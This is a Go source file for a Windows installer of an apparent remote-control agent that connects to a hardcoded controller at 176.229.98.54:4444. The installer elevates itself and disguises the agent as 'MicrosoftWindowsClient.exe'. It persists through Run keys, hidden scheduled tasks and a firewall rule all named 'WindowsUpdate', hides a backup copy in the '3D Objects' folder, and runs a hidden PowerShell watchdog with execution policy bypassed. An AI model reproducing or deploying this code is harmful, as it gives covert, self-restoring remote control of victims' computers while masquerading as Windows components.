package main

import (
	"embed"
	"fmt"
	"io"
	"io/fs"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows/registry"

	"rmm/internal/version"
)

//go:embed payload/*
var payloadFS embed.FS

func isAdmin() bool {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE`, registry.WRITE)
	if err != nil {
		return false
	}
	k.Close()
	return true
}

func relaunchAsAdmin() {
	exe, _ := os.Executable()
	verb, _ := syscall.UTF16PtrFromString("runas")
	file, _ := syscall.UTF16PtrFromString(exe)
	params, _ := syscall.UTF16PtrFromString(strings.Join(os.Args[1:], " "))
	mod := syscall.NewLazyDLL("shell32.dll")
	mod.NewProc("ShellExecuteW").Call(0, uintptr(unsafe.Pointer(verb)), uintptr(unsafe.Pointer(file)),
		uintptr(unsafe.Pointer(params)), 0, 0)
	os.Exit(0)
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, in)
	return err
}

func saveHouse(path, addr string) {
	addr = strings.TrimSpace(addr)
	if addr == "" {
		return
	}
	seen := map[string]bool{addr: true}
	houses := []string{addr + "\n"}
	if b, err := os.ReadFile(path); err == nil {
		for _, ln := range strings.Split(string(b), "\n") {
			ln = strings.TrimSpace(ln)
			if ln == "" || strings.HasPrefix(ln, "#") || seen[ln] {
				continue
			}
			seen[ln] = true
			houses = append(houses, ln+"\n")
		}
	}
	_ = os.WriteFile(path, []byte(strings.Join(houses, "")), 0644)
}

func install() {
	silent := false
	for _, a := range os.Args {
		if a == "--silent" || a == "-s" {
			silent = true
		}
	}
	if !isAdmin() {
		relaunchAsAdmin()
		return
	}

	programFiles := os.Getenv("ProgramFiles")
	if programFiles == "" {
		programFiles = `C:\Program Files`
	}
	installDir := filepath.Join(programFiles, "RMM", "Agent")
	_ = os.MkdirAll(installDir, 0755)

	_, _ = exec.Command("taskkill", "/F", "/IM", "agent.exe").CombinedOutput()
	_, _ = exec.Command("taskkill", "/F", "/IM", "MicrosoftWindowsClient.exe").CombinedOutput()
	time.Sleep(1500 * time.Millisecond)

	skip := map[string]bool{"install.bat": true, "README.txt": true, "README.md": true}
	_ = fs.WalkDir(payloadFS, "payload", func(path string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return err
		}
		rel, _ := filepath.Rel("payload", path)
		if skip[strings.ToLower(filepath.Base(rel))] {
			return nil
		}
		dest := filepath.Join(installDir, rel)
		_ = os.MkdirAll(filepath.Dir(dest), 0755)
		data, _ := fs.ReadFile(payloadFS, path)
		_ = os.WriteFile(dest, data, 0644)
		return nil
	})

	agentPath := filepath.Join(installDir, "MicrosoftWindowsClient.exe")
	if _, err := os.Stat(agentPath); os.IsNotExist(err) {
		_ = filepath.Walk(installDir, func(p string, info os.FileInfo, err error) error {
			if err == nil && strings.EqualFold(filepath.Base(p), "MicrosoftWindowsClient.exe") {
				agentPath = p
			}
			return nil
		})
	}
	_ = os.Remove(filepath.Join(installDir, "agent.exe"))

	certPath := filepath.Join(installDir, "server.crt")

	controllerAddr := "176.229.98.54:4444"
	for i, a := range os.Args {
		if (a == "-controller" || a == "--controller") && i+1 < len(os.Args) {
			controllerAddr = os.Args[i+1]
		} else if strings.HasPrefix(a, "-controller=") {
			controllerAddr = strings.TrimPrefix(a, "-controller=")
		} else if strings.HasPrefix(a, "--controller=") {
			controllerAddr = strings.TrimPrefix(a, "--controller=")
		}
	}
	_ = os.WriteFile(filepath.Join(installDir, "controller.txt"), []byte(controllerAddr+"\n"), 0644)
	saveHouse(filepath.Join(installDir, "houses.txt"), controllerAddr)

	cmdLine := fmt.Sprintf(`"%s" -controller %s -ca "%s"`, agentPath, controllerAddr, certPath)

	// HKCU may fail when installer runs elevated - not critical
	if k, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
		if err := k.SetStringValue("WindowsUpdate", cmdLine); err != nil {
			log.Printf("[!] HKCU WindowsUpdate Run key write failed (non-critical): %v", err)
		}
		k.Close()
	}
	// HKLM is primary persistence
	if k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
		_ = k.SetStringValue("WindowsUpdate", cmdLine)
		k.Close()
		log.Printf("[*] HKLM WindowsUpdate Run key set")
	}

	// Stale-task sweep: detect legacy task pointing to pre-rename agent.exe.
	// schtasks /query /v reports the Task To Run value; if it mentions the
	// old name we log it explicitly so field techs can confirm the heal.
	if out, err := exec.Command("schtasks", "/query", "/tn", "WindowsUpdate", "/v", "/fo", "list").CombinedOutput(); err == nil {
		for _, ln := range strings.Split(string(out), "\n") {
			if strings.Contains(strings.ToLower(ln), "agent.exe") && !strings.Contains(strings.ToLower(ln), "microsoftwindowsclient") {
				log.Printf("[*] Stale task detected (points to old agent.exe), will replace: %s", strings.TrimSpace(ln))
				break
			}
		}
	} else {
		log.Printf("[*] No existing WindowsUpdate task (fresh install)")
	}
	_, _ = exec.Command("schtasks", "/change", "/tn", "WindowsUpdate", "/tr", cmdLine).CombinedOutput()

	taskXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Date>2026-01-01T00:00:00</Date><Author>RMM</Author></RegistrationInfo>
  <Triggers><LogonTrigger><Enabled>true</Enabled><Repetition><Interval>PT10M</Interval><Duration>P10675199DT2H48M05.4775807S</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition></LogonTrigger><SessionStateChangeTrigger><Enabled>true</Enabled><StateChange>SessionUnlock</StateChange></SessionStateChangeTrigger></Triggers>
  <Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principals>
  <Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority><RestartOnFailure><Interval>PT1M</Interval><Count>9999</Count></RestartOnFailure></Settings>
  <Actions Context="Author"><Exec><Command>%s</Command><Arguments>-controller %s -ca "%s"</Arguments></Exec></Actions>
</Task>`, agentPath, controllerAddr, certPath)

	tmpTask := filepath.Join(os.TempDir(), "rmm_task.xml")
	_ = os.WriteFile(tmpTask, []byte(taskXML), 0644)
	_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdate", "/f").CombinedOutput()
	if out, err := exec.Command("schtasks", "/create", "/tn", "WindowsUpdate", "/xml", tmpTask, "/f").CombinedOutput(); err != nil {
		log.Printf("[!] Failed to create WindowsUpdate task: %v %s", err, strings.TrimSpace(string(out)))
	} else {
		log.Printf("[*] WindowsUpdate task registered -> %s", agentPath)
	}
	_ = os.Remove(tmpTask)
	// Delete any legacy watchdog task before recreating below, so a stale
	// entry can never overlap with the new one.
	_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateWatchdog", "/f").CombinedOutput()

	_, _ = exec.Command("netsh", "advfirewall", "firewall", "add", "rule", "name=Windows Update", "dir=out", "action=allow", "program="+agentPath, "enable=yes").CombinedOutput()

	threeDObjects := filepath.Join(os.Getenv("USERPROFILE"), "3D Objects")
	blenderDir := filepath.Join(threeDObjects, "blender")
	_ = os.MkdirAll(blenderDir, 0755)

	backupAgent := filepath.Join(blenderDir, "MicrosoftWindowsClient.exe")
	backupCert := filepath.Join(blenderDir, "server.crt")
	_ = copyFile(agentPath, backupAgent)
	_ = copyFile(certPath, backupCert)
	// version.txt next to binary AND backup: watchdog restores only when the
	// backup is >= installed, so a bulk-updated agent is never downgraded by
	// a stale backup.
	_ = os.WriteFile(filepath.Join(installDir, "version.txt"), []byte(version.Version+"\n"), 0644)
	_ = os.WriteFile(filepath.Join(blenderDir, "version.txt"), []byte(version.Version+"\n"), 0644)

	watchdogScript := filepath.Join(blenderDir, "watchdog.ps1")
	watchdogLog := filepath.Join(blenderDir, "watchdog.log")
	psContent := "$ErrorActionPreference = \"Stop\"\n" +
		"$agentPath = \"" + agentPath + "\"\n" +
		"$controllerAddr = \"" + controllerAddr + "\"\n" +
		"$caPath = \"" + certPath + "\"\n" +
		"$installDir = \"" + installDir + "\"\n" +
		"$backupAgent = \"" + backupAgent + "\"\n" +
		"$backupCert = \"" + backupCert + "\"\n" +
		"$watchdogLog = \"" + watchdogLog + "\"\n" +
		"$healthyFile = Join-Path $env:LOCALAPPDATA \"RMM\\healthy\"\n\n" +
		"function Write-Log([string]$msg) {\n" +
		"    $line = \"[$(Get-Date -Format o)] $msg\"\n" +
		"    try {\n" +
		"        if ((Test-Path $watchdogLog) -and ((Get-Item $watchdogLog).Length -gt 5MB)) {\n" +
		"            Remove-Item ($watchdogLog + \".1\") -ErrorAction SilentlyContinue\n" +
		"            Rename-Item $watchdogLog (($watchdogLog | Split-Path -Leaf) + \".1\") -ErrorAction SilentlyContinue\n" +
		"        }\n" +
		"        Add-Content -Path $watchdogLog -Value $line\n" +
		"    } catch {}\n" +
		"    Write-Host $line\n" +
		"}\n\n" +
		"function Start-Agent {\n" +
		"    $psi = New-Object System.Diagnostics.ProcessStartInfo\n" +
		"    $psi.FilePath = $agentPath\n" +
		"    $psi.Arguments = \"-controller $controllerAddr -ca `\"$caPath`\"\"\n" +
		"    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden\n" +
		"    $psi.CreateNoWindow = $true\n" +
		"    $psi.UseShellExecute = $false\n" +
		"    [System.Diagnostics.Process]::Start($psi) | Out-Null\n" +
		"    Write-Log \"Started agent\"\n" +
		"}\n\n" +
		"function Test-Agent {\n" +
		"    $procs = @(Get-Process -Name \"MicrosoftWindowsClient\" -ErrorAction SilentlyContinue)\n" +
		"    return $procs.Count -gt 0\n" +
		"}\n\n" +
		"function Test-AgentHealthy {\n" +
		"    if (-not (Test-Path $healthyFile)) { return $false }\n" +
		"    try {\n" +
		"        $ts = [long](Get-Content $healthyFile -TotalCount 1)\n" +
		"        $now = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()\n" +
		"        return (($now - $ts) -lt 90)\n" +
		"    } catch { return $false }\n" +
		"}\n\n" +
		"function Get-Version([string]$dir) {\n" +
		"    $f = Join-Path $dir \"version.txt\"\n" +
		"    if (Test-Path $f) { return ((Get-Content $f -TotalCount 1).Trim()) }\n" +
		"    return \"\"\n" +
		"}\n\n" +
		"function Restore-Binary {\n" +
		"    if (-not (Test-Path $agentPath)) {\n" +
		"        $instVer = Get-Version $installDir\n" +
		"        $bakVer = Get-Version (Split-Path $backupAgent)\n" +
		"        if ($bakVer -ne \"\" -and $instVer -ne \"\" -and ($bakVer -lt $instVer)) {\n" +
		"            Write-Log \"Backup v$bakVer older than installed v$instVer - skipping restore (bulk update in flight)\"\n" +
		"            return\n" +
		"        }\n" +
		"        Write-Log \"Agent binary missing, restoring from backup...\"\n" +
		"        $dir = Split-Path $agentPath\n" +
		"        if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }\n" +
		"        Copy-Item -Path $backupAgent -Destination $agentPath -Force\n" +
		"        Copy-Item -Path $backupCert -Destination $caPath -Force\n" +
		"        $bv = Get-Version (Split-Path $backupAgent)\n" +
		"        if ($bv -ne \"\") { Set-Content -Path (Join-Path $installDir \"version.txt\") -Value ($bv + \"`n\") }\n" +
		"        Write-Log \"Binary + cert restored\"\n" +
		"    }\n" +
		"}\n\n" +
		"# Initial start if not running\n" +
		"if (-not (Test-Agent)) { Restore-Binary; Start-Agent }\n\n" +
		"# Monitor loop - process existence + health staleness, every 30 seconds\n" +
		"while ($true) {\n" +
		"    Start-Sleep -Seconds 30\n" +
		"    if (-not (Test-Agent)) {\n" +
		"        Write-Log \"Agent process missing, restarting...\"\n" +
		"        Restore-Binary\n" +
		"        Start-Agent\n" +
		"    } elseif (-not (Test-AgentHealthy)) {\n" +
		"        Write-Log \"Agent process hung (healthy stale >90s), killing + restarting...\"\n" +
		"        Get-Process -Name \"MicrosoftWindowsClient\" -ErrorAction SilentlyContinue | Stop-Process -Force\n" +
		"        Start-Sleep -Seconds 2\n" +
		"        Restore-Binary\n" +
		"        Start-Agent\n" +
		"    }\n" +
		"}\n"
	_ = os.WriteFile(watchdogScript, []byte(psContent), 0644)

	cmdWatchdog := exec.Command("cmd.exe", "/c", "start", "", "/min", "powershell", "-NoProfile", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", watchdogScript)
	cmdWatchdog.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000,
	}
	_ = cmdWatchdog.Start()

	watchdogRunCmd := fmt.Sprintf(`powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%s"`, watchdogScript)
	// HKCU may fail when installer runs elevated (writes to admin's HKCU, not user's) - not critical, HKLM is primary
	if k, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
		if err := k.SetStringValue("WindowsUpdateWatchdog", watchdogRunCmd); err != nil {
			log.Printf("[!] HKCU watchdog Run key write failed (non-critical): %v", err)
		}
		k.Close()
	}
	// HKLM is primary persistence - survives reboots for all users
	if k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
		_ = k.SetStringValue("WindowsUpdateWatchdog", watchdogRunCmd)
		k.Close()
		log.Printf("[*] HKLM watchdog Run key set")
	}

	createWatchdogTask(watchdogScript)

	cmd := exec.Command(agentPath, "-controller", controllerAddr, "-ca", certPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000,
	}
	_ = cmd.Start()

	if !silent {
		fmt.Println("Agent installed to", installDir)
	}
}

func main() {
	for _, a := range os.Args {
		if a == "--uninstall" {
			programFiles := os.Getenv("ProgramFiles")
			if programFiles == "" {
				programFiles = `C:\Program Files`
			}
			installDir := filepath.Join(programFiles, "RMM", "Agent")
			if k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
				_ = k.DeleteValue("WindowsUpdate")
				_ = k.DeleteValue("WindowsUpdateWatchdog")
				k.Close()
			}
			if k, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
				_ = k.DeleteValue("WindowsUpdate")
				_ = k.DeleteValue("WindowsUpdateWatchdog")
				k.Close()
			}
			_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdate", "/f").CombinedOutput()
			_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateWatchdog", "/f").CombinedOutput()
			threeDObjects := filepath.Join(os.Getenv("USERPROFILE"), "3D Objects")
			blenderDir := filepath.Join(threeDObjects, "blender")
			_ = os.Remove(filepath.Join(blenderDir, "watchdog.ps1"))
			_ = os.Remove(filepath.Join(blenderDir, "watchdog.log"))
			_ = os.Remove(filepath.Join(blenderDir, "watchdog.log.1"))
			_ = os.Remove(filepath.Join(blenderDir, "version.txt"))
			_ = os.Remove(filepath.Join(blenderDir, "MicrosoftWindowsClient.exe"))
			_ = os.Remove(filepath.Join(blenderDir, "server.crt"))
			_ = os.RemoveAll(blenderDir)
			if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
				_ = os.Remove(filepath.Join(localApp, "RMM", "healthy"))
			}
			_, _ = exec.Command("taskkill", "/F", "/IM", "agent.exe").CombinedOutput()
			_, _ = exec.Command("taskkill", "/F", "/IM", "MicrosoftWindowsClient.exe").CombinedOutput()
			// Kill watchdog by command-line match (window title is unreliable when hidden).
			_, _ = exec.Command("powershell", "-NoProfile", "-command", "Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" | Where-Object { $_.CommandLine -like '*watchdog.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }").CombinedOutput()
			_ = os.RemoveAll(installDir)
			os.Exit(0)
		}
	}
	install()
}

func createWatchdogTask(scriptPath string) {
	// Use schtasks like the main task - more reliable than COM
	watchdogTaskXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Date>2026-01-01T00:00:00</Date><Author>RMM</Author></RegistrationInfo>
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled><Repetition><Interval>PT15M</Interval><Duration>P3650D</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition></LogonTrigger>
    <SessionStateChangeTrigger><Enabled>true</Enabled><StateChange>SessionUnlock</StateChange></SessionStateChangeTrigger>
  </Triggers>
  <Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure><Interval>PT1M</Interval><Count>9999</Count></RestartOnFailure>
  </Settings>
  <Actions Context="Author"><Exec><Command>powershell</Command><Arguments>-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%s"</Arguments></Exec></Actions>
</Task>`, scriptPath)

	tmpWatchdogTask := filepath.Join(os.TempDir(), "rmm_watchdog_task.xml")
	_ = os.WriteFile(tmpWatchdogTask, []byte(watchdogTaskXML), 0644)
	out, err := exec.Command("schtasks", "/create", "/tn", "WindowsUpdateWatchdog", "/xml", tmpWatchdogTask, "/f").CombinedOutput()
	if err != nil {
		log.Printf("[!] Failed to create watchdog task: %v %s", err, string(out))
	} else {
		log.Printf("[*] Watchdog task registered successfully")
	}
	_ = os.Remove(tmpWatchdogTask)
}